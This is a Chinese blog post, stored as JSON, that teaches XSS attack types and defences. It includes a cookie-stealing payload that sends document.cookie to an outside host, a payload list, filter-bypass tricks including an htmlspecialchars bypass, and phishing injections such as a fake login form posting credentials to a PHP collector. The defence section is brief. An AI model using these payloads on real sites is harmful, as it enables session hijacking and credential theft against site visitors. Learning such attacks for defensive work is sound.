{"title":"XSS 攻击和防御","slug":"XSS攻击和防御","date":"2019-02-24T04:20:08.110Z","updated":"2019-02-25T12:49:39.652Z","comments":true,"path":"api/articles/XSS攻击和防御.json","photos":[],"link":"","excerpt":"XSS 简介xss 全称(Cross Site Scripting)跨站脚本攻击，为了不和层叠样式表(Cascading Style Sheet, CSS) 缩写混淆，因此写作 XSS。属于一种脚本注入攻击，也就是攻击者把恶意脚本、html注入网站，当前其他用户访问的时候，这些恶意脚本、html 就在注入的网站的上下文中运行，从而对访问者造成攻击。","covers":["https://ws2.sinaimg.cn/large/006tKfTcgy1fnqsur5ioqj30z608wac1.jpg","https://ws1.sinaimg.cn/large/006tKfTcgy1fnqtxapmpwj31f00aydj4.jpg","https://ws1.sinaimg.cn/large/006tKfTcgy1fnqtz8y3yrj317c0zck0k.jpg","https://ws2.sinaimg.cn/large/006tKfTcgy1fnqw9mtkh7j31g80oujyh.jpg","https://ws1.sinaimg.cn/large/006tKfTcgy1fnqwao6jdwj31g40s6ai9.jpg","https://ws3.sinaimg.cn/large/006tKfTcgy1fnqwuksg5sj30fd04u0ss.jpg"],"content":"<h3 id=\"XSS-简介\"><a href=\"#XSS-简介\" class=\"headerlink\" title=\"XSS 简介\"></a>XSS 简介</h3><p>xss 全称(Cross Site Scripting)跨站脚本攻击，为了不和层叠样式表(Cascading Style Sheet, CSS) 缩写混淆，因此写作 XSS。属于一种脚本注入攻击，也就是攻击者把恶意脚本、html注入网站，当前其他用户访问的时候，这些恶意脚本、html 就在注入的网站的上下文中运行，从而对访问者造成攻击。</p>\n<a id=\"more\"></a>\n<h3 id=\"XSS-攻击危害\"><a href=\"#XSS-攻击危害\" class=\"headerlink\" title=\"XSS 攻击危害\"></a>XSS 攻击危害</h3><ul>\n<li>盗取用户 Cookie：有一天你发现仅剩 4 块钱（一个桶面）余额的银行卡，被转走了3.5 块到一位陌生用户，痛哭流涕的想着自己的晚餐（桶面）的情况下拨通了客服电话，接电话的还是个男的，顿时火冒三丈：谁转走了我的桶面，哦不，3.5 块? 客服查了下转账记录说：先生，您于某时某分某地登录银行网站转了 3.5 块给某某。此处省略1000字…….，很可能就是 Cookie 被盗走了，利用你在网站的权限把钱转走，还有 5 毛买个糖瓜吧。</li>\n<li>导航到恶意网站：点击某个连接，进去的却是另外一个恶俗网站。</li>\n<li>记录用户行为：攻击者可以通过使用 addEventListener 方法注册监听键盘事件的回调函数，并把所有用户行为发送到服务器，这些敲击行为可能记录者用户的敏感信息，比如密码和信用卡信息。</li>\n<li>插入广告：是否有过这样的经历，当你通过某个连接进入某个网站的时候发现一顿不堪入目的广告（前提的是你没开广告拦截器）</li>\n<li>钓鱼网站：这个词是否经常在某某新闻 APP 上看到？攻击者修改 DOM 插入假的登录框，或者把表单的action 属性指向他自己的服务器，然后欺骗用户提交用户的铭感信息。</li>\n</ul>\n<h3 id=\"XSS-攻击方式\"><a href=\"#XSS-攻击方式\" class=\"headerlink\" title=\"XSS 攻击方式\"></a>XSS 攻击方式</h3><p>既然 XSS 可以造成这么大危害，当然应该建立一些防范措施。但是，不急，在聊防范方式之前，我们先来分析 XSS 是怎么实现上述攻击的？有哪些攻击方式？如何联合其他攻击方式一起使用？</p>\n<p>XSS 共分为三种攻击方式，从易用上，存储型 XSS &gt; DOM 型 XSS &gt; 反射型 XSS。</p>\n<h4 id=\"存储型-XSS\"><a href=\"#存储型-XSS\" class=\"headerlink\" title=\"存储型 XSS\"></a>存储型 XSS</h4><p>我们从简单的开始，存储型 XSS 就是存入了数据库，在取出来，导致 XSS。比较典型的地方是：消息论坛，评论区，留言板 XSS。攻击者构造好攻击代码，提交到评论区，当其他用户进入这个页面的时候，浏览器从服务器拉取数据，并做正常的 html 和 js 解析执行，进而触发 XSS 攻击。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">户访问页面 &gt; 浏览器获取 html | js（包括攻击代码）解析执行 &gt; 完成攻击</span><br></pre></td></tr></table></figure>\n<p>那么攻击者是如何发现 XSS 漏洞，有是如何构造攻击代码提交到评论区的呢？这是一个比较大问题，这里分析个简单的demo，要看整个攻击的分析过程请转 <a href=\"http://imweb.io/topic/56b876a65c49f9d377ed8ef6\" target=\"_blank\" rel=\"noopener\">刘志龙大神-从零开始学 web 安全</a></p>\n<p>原本的留言版如下：</p>\n<p><img src=\"https://ws2.sinaimg.cn/large/006tKfTcgy1fnqsur5ioqj30z608wac1.jpg\" alt=\"图片\"></p>\n<p>为了简单点，上图的 input 没有做任何过滤与转码，我们直接提交下面的代码（这其实就是一种常见的 XSS payload。具体请看下文分析）：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hi, 你的 cookie 要被盗了哟&lt;img src=1 onerror=&quot;fetch(`http://www.xsshack.com/?cookie=$&#123;document.cookie&#125;`)&quot; /&gt;</span><br></pre></td></tr></table></figure>\n<p>可以发现已经将攻击代码注入到留言区了：</p>\n<p><img src=\"https://ws1.sinaimg.cn/large/006tKfTcgy1fnqtxapmpwj31f00aydj4.jpg\" alt=\"图片\"></p>\n<p>当其他用户访问当前页面的时候，cookie 就会被盗取（demo 的 url 随意写的，因此respose 会 502）：</p>\n<p><img src=\"https://ws1.sinaimg.cn/large/006tKfTcgy1fnqtz8y3yrj317c0zck0k.jpg\" alt=\"图片\"></p>\n<h4 id=\"DOM-型-XSS\"><a href=\"#DOM-型-XSS\" class=\"headerlink\" title=\"DOM 型 XSS\"></a>DOM 型 XSS</h4><p>简单理解就是它的输出点在 DOM，和后端完全没有关系，攻击者只要诱导别人去点击有 XSS 代码的 URL 就能实现攻击。看下面的 demo：</p>\n<p>原始代码</p>\n<p><img src=\"https://ws2.sinaimg.cn/large/006tKfTcgy1fnqw9mtkh7j31g80oujyh.jpg\" alt=\"图片\"></p>\n<p>带有 XSS 代码的 URL，只要将这个链接发出去，诱导其他人点击就能造成攻击，这里同样用了上面例子的 payload (还挺好用的 ^_^)</p>\n<p><img src=\"https://ws1.sinaimg.cn/large/006tKfTcgy1fnqwao6jdwj31g40s6ai9.jpg\" alt=\"图片\"></p>\n<h4 id=\"反射型-XSS\"><a href=\"#反射型-XSS\" class=\"headerlink\" title=\"反射型 XSS\"></a>反射型 XSS</h4><p>反射型 XSS，也是通过给别人发送带有 XSS 代码的链接，诱导其他人点击进而造成攻击。与 DOM 型 XSS 不同的是，这类型攻击一般出现在搜索页面，需要将注入代码从目标服务器通过错误信息、搜索结果等方式“反射”回来，在受害者浏览器上执行，而 DOM 型 XSS 是不需要经过目标服务器的，明白这点就很容易区分 反射性 XSS 和 DOM 型 XSS 了。</p>\n<p>看下面这个经典案例：</p>\n<blockquote>\n<p>如下登录页面，我们为了用户能在登录之后访问到之前浏览的页面，所以在url加入了一个service参数，但是未对它做任何校验，可能会被钓鱼网站利用。</p>\n</blockquote>\n<p><img src=\"https://ws3.sinaimg.cn/large/006tKfTcgy1fnqwuksg5sj30fd04u0ss.jpg\" alt=\"图片\"></p>\n<p><strong>该攻击实现条件：</strong></p>\n<ol>\n<li>用户点击了如下连接：<br><a href=\"https://cas.utest.qq.com/qqlogin?service=http%3A%2F%2Fpianzi.com；\" target=\"_blank\" rel=\"noopener\">https://cas.utest.qq.com/qqlogin?service=http%3A%2F%2Fpianzi.com；</a></li>\n<li>后端未对service参数做校验，这个连接可以正常跳转到上图的页面；</li>\n<li>用户输入帐号登录后，跳转到 <a href=\"\">pianzi.com；</a></li>\n<li>这是个钓鱼网站，通过网站风格欺骗，对用户进行引导性操作；</li>\n<li>用户输入一些有用的信息；</li>\n<li>在不知不觉之间，用户泄漏了自己的信息。</li>\n</ol>\n<h3 id=\"XSS-payload\"><a href=\"#XSS-payload\" class=\"headerlink\" title=\"XSS payload\"></a>XSS payload</h3><p>上面有谈到窃取 cookie 的 demo 中谈到了 XSS payload, XSS payload 是什么？</p>\n<blockquote>\n<p>XSS攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用已完成各种具体功能的恶意脚本，被称为”XSS payload”。</p>\n</blockquote>\n<blockquote>\n<p>XSS Payload实际上就是JavaScript脚本（还可以是Flash或其他富客户端的脚本），所以任何Javascript脚本能实现的功能，XSS Payload都能做到。</p>\n</blockquote>\n<p>举几个列子，非常多：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class=\"line\">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;</span><br><span class=\"line\">&lt;iframe onload=alert(1)&gt;</span><br><span class=\"line\">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class=\"line\">&lt;a href=&quot;javascript:alert(1)&quot;&gt;111&lt;/a&gt;</span><br><span class=\"line\">&lt;marquee onscroll=alert(1)&gt;</span><br><span class=\"line\">&lt;object data=&quot;javascript:alert(1)&quot;&gt;</span><br><span class=\"line\">&lt;svg onload=alert(1)&gt;</span><br><span class=\"line\">&lt;body onload=alert(1)&gt;</span><br><span class=\"line\">&lt;select name=&quot;&quot; onmouseover=alert(1)&gt;</span><br><span class=\"line\">&lt;script&gt;window.setAttribute(&apos;onload&apos;,alert(&apos;xss&apos;)&lt;/script&gt;</span><br><span class=\"line\">Javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</span><br><span class=\"line\">&lt;img src=1 onerror=with(body)createElement(&apos;script&apos;).src=&quot;外部JS地址&quot;&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"入侵方法（摘自XSS的利用方式—-朽木原创\"><a href=\"#入侵方法（摘自XSS的利用方式—-朽木原创\" class=\"headerlink\" title=\"入侵方法（摘自XSS的利用方式—-(朽木原创)\"></a>入侵方法（摘自<a href=\"http://nvhack.com/forum.php?mod=viewthread&amp;tid=162&amp;extra=page%3D1\" target=\"_blank\" rel=\"noopener\">XSS的利用方式—-(朽木原创)</a></h3><p>攻击者发现xss漏洞-&gt;构造代码-&gt;发送给受害人-&gt;受害人打开-&gt;窃取受害人cookie-&gt;完成攻击.</p>\n<p><strong>盗取cookie:</strong>可以使用现成的xss平台.</p>\n<p>如果cookie中的某些关键值加了HttpOnly,那么就可以避免该网页的cookie被客户端的JS存取，也就保护了用户的cookie不被盗取.</p>\n<p>当前可见的绕过Httponly的方法大致可以分为两类：一类是服务器配置或功能实现上存在可能被利用的弱点，可归结为服务端的信息泄露。如利用404 页、PHPINFO页，Trace方法等绕过HTTPonly；另一类是客户端漏洞或功能上存在可以被利用的弱点，可归结为客户端的信息泄露。如 MS08-069、利用ajax或flash读取set-cookie等。</p>\n<p><strong>绕过防御</strong></p>\n<p><strong>过滤了alert(1)的括号,可以用alert<code>1</code>  //反引号</strong></p>\n<p><strong>利用js字符串模块  eval.call<code>${&#39;\\141\\154\\145\\162\\164\\50\\61\\51&#39;}</code></strong></p>\n<p><strong>转换大小写<script>alert(1)<ScRipt></strong></p>\n<p><strong>绕过Php的htmlspecialchars()</strong></p>\n<p>Php的htmlspecialchars()默认能将&lt; &gt; &amp; “转成&lt; &gt; &amp; “</p>\n<p>如果用了htmlspecialchars($name, ENT_QUOTES);   则 ’ 也会被转成 ‘</p>\n<p>如果用了 htmlspecialchars ($name, ENT_NOQUOTES);则单双引号都不会被转换。</p>\n<p><strong>J**</strong>s中可用以下代码绕过**：</p>\n<p>Javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</p>\n<p><strong>H**</strong>tml中可用以下代码绕过**:</p>\n<p>‘ onmouseover=’alert(1)</p>\n<p>源代码是<input type=”text” value=””></p>\n<p>变成了<input type=”text” value=” ‘ onmouseover=’alert(1)”></p>\n<p><strong>2.php源代码</strong></p>\n<p>&lt;?php</p>\n<p>$name = $_GET[“name”];</p>\n<p>$name = htmlspecialchars($name);</p>\n<p>?&gt;</p>\n<input type='text' value='<?php echo $name?>'>\n\n<p>地址栏输入<a href=\"http://127.0.0.1/2.php?name\">http://127.0.0.1/2.php?name</a>=’ onmouseover=’alert(1)后回车</p>\n<p>然后将鼠标移到那个框框后， 弹出弹窗.</p>\n<p><strong>Xss钓鱼(挂马):</strong></p>\n<p>(1)<strong>xss重定向钓鱼</strong></p>\n<p>如自己建一个钓鱼网站<a href=\"http://www.xiumu.com\">www.xiumu.com</a>, 然后受害者访问如下地址<a href=\"http://www.test.com/a.php?id=””&gt;\">http://www.test.com/a.php?id=””&gt;</a><script>document.location.href=”<a href=\"http://www.xiumu.com/\">http://www.xiumu.com</a>”</script></strong></p>\n<p>或者<a href=\"http://www.test.com/a.php?id=””&gt;\" target=\"_blank\" rel=\"noopener\">http://www.test.com/a.php?id=””&gt;</a>&lt;iframe src=”<a href=\"http://www.xiumu.com/\" target=\"_blank\" rel=\"noopener\">http://www.xiumu.com</a>” height=0 width=0 &gt;</p>\n<p>(2)<strong>HTML注入式钓鱼</strong></p>\n<p>直接利用XSS漏洞注射HTML/js 代码到页面中.可写一个正常的HTML表单来窃取账号密码.如:<a href=\"http://www.test.com/a.php?id=\" target=\"_blank\" rel=\"noopener\">http://www.test.com/a.php?id=</a>””<html><head><title>login</title></head><body><div style=\"”text-align:center;”\"><form method=\"”POST”\" action=\"”xiumu.php”\" name=\"”form”\"><br><p>username</p><input type=\"”text”\" value=\"””\" name=\"”a”\"><p>password</p><input type=\"”password”\" name=\"”b”\" value=\"””\"><br><input type=\"”submit”\" value=\"”login”\"></form></div></body></html></p>\n<p>这样当用户直接填入账号密码提交后，你就可以在xiumu.php接收到受害者的账号密码了.</p>\n<p>Xiumu.php代码:&lt;?php echo $_POST[‘a’]?&gt;&lt;?php echo $_POST[‘b’]?&gt;</p>\n<p>(3)<strong>Xss跨框架钓鱼</strong></p>\n<p>这种方式是通过<iframe>嵌入远程域的一个页面实施钓鱼<strong>,</strong><a href=\"http://www.test.com/a.php?id=””&gt;\" target=\"_blank\" rel=\"noopener\">http://www.test.com/a.php?id=””&gt;</a>&lt;iframe src=”<a href=\"http://www.xiumu.com/\" target=\"_blank\" rel=\"noopener\">http://www.xiumu.com</a>” height=”100%” width=”100%”&gt;</iframe>将<a href=\"http://www.xiumu.com的页面做的和test的页面相同(可利用iframe实现)，但受害者看到的不是真正的test页面，而是xiumu页面\" target=\"_blank\" rel=\"noopener\">www.xiumu.com的页面做的和test的页面相同(可利用iframe实现)，但受害者看到的不是真正的test页面，而是xiumu页面</a>.</p>\n<p>（4）xss.tv 是个好网站</p>\n<h3 id=\"常用编码\"><a href=\"#常用编码\" class=\"headerlink\" title=\"常用编码\"></a>常用编码</h3><p>刘志龙大神分析的很好，这里就不再赘述，<a href=\"http://nvhack.com/forum.php?mod=viewthread&amp;tid=162&amp;extra=page%3D1\" target=\"_blank\" rel=\"noopener\">刘志龙-从零开始学web安全（3）</a></p>\n<h3 id=\"XSS-防御\"><a href=\"#XSS-防御\" class=\"headerlink\" title=\"XSS 防御\"></a>XSS 防御</h3><p>XSS防御基本上遵循七条原则:</p>\n<ol>\n<li>不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码</li>\n<li>在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</li>\n<li>在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码</li>\n<li>在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码</li>\n<li>在将不可信数据插入到Style属性里时，对这些数据进行CSS编码</li>\n<li>在将不可信数据插入到HTML URL里时，对这些数据进行URL编码</li>\n<li>使用富文本时，使用XSS规则引擎进行编码过滤</li>\n</ol>\n<p><a href=\"http://www.freebuf.com/articles/web/9977.html\" target=\"_blank\" rel=\"noopener\">参考链接</a></p>\n","categories":[{"name":"web安全","slug":"web安全","count":2,"path":"api/categories/web安全.json"}],"tags":[{"name":"XSS","slug":"XSS","count":1,"path":"api/tags/XSS.json"}]}